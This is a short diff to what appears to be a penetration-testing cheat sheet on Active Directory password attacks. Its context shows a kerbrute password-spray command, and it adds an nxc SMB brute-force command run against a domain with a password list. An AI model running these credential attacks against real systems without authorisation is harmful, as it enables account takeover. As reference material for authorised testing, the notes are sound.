@@ -20,6 +20,10 @@ Do a password attack by using username as password
 
     kerbrute passwordspray -d domain.local --dc dc.domain.local --user-as-pass users.txt
 
+Brute force attack
+
+    nxc smb domain.local -u user -p passwords.txt 
+
 ## Password
 
 ### 1) Password Spray
